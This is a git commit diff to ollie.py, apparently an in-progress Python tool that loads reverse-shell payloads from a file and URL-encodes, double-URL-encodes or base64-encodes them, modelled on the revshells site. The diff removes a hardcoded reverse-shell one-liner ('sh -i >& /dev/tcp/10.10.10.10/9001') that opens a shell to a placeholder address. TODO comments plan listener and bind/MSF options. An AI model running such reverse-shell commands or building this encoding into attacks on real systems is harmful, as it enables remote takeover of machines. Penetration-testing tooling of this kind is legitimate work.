cfaf8a0064cb3afa255f9ec2cc6ec78edfc55e7f
Anirudh Dilli <anirudhdilli@gmail.com>
2022-11-30 19:30:48 +0530

    finished working on all encoding options from revshells

--- ollie.py
+++ ollie.py
@@ -2,6 +2,7 @@ import fileinput
 import os
 from sys import argv
 import urllib.parse
+import base64
 
 #########################################################
 
@@ -35,13 +36,13 @@ def display_payload_options():
   print(file_contents)
   f.close()
 
-def yet_to_decide():
+def main():
   # open the sample file used
   file = open('assets/payloads.txt')
   # read the content of the file opened
   content = file.readlines()
   # read nth line from the file
-  print(content[0])
+  return(content[0])
 
 #yet_to_decide()
 
@@ -49,19 +50,23 @@ def yet_to_decide():
 
 # This function is for urlencoding the payloads.
 def url_encode():
-  alpha = urllib.parse.quote("String I want in here(the shells that want to be URL encoded by the user.)", safe='')
+  alpha = urllib.parse.quote(main(), safe='')
   print(alpha)
 
 # This function is for double urlencoding the payloads.
 def double_url_encode():
-  bravo = urllib.parse.quote("sh -i >& /dev/tcp/10.10.10.10/9001 0>&1", safe='')
+  bravo = urllib.parse.quote(main(), safe='')
   charlie = urllib.parse.quote(bravo, safe='')
   print(charlie)
 
+def base64_encode():
+  delta = 'PAYLOAD'
+  echo = delta.encode('utf-8')
+  foxtrot = base64.b64encode(echo)
+  print(foxtrot.decode('utf-8'))
+
 # TODO: Work on printing the stuff from display_payload_options() function in a grid format. Ref: https://stackoverflow.com/questions/32460832/print-a-list-of-strings-in-a-grid-format-python
-# TODO: Decide on a name for the yet_to_decide() function.
 # TODO: Do the manual labour of putting all the payloads into a txt file.
-# TODO: Work on functions for encoding options & shell options. UPDATE 1: DONE WITH SINGLE URL ENCODING. UPDATE 2: DONE WITH DOUBLE URL ENCODING.
 # TODO: Work on listener options.
 # TODO: Work on how I can do most of this from single command in the terminal instead of throwing the user a whole bunch of fucking prompts once they run the tool.
 # TODO: ^^ Includes how to select Reverse, Bind or MSF and how to select a particular payload they want(inside the sections in the revhsells website).
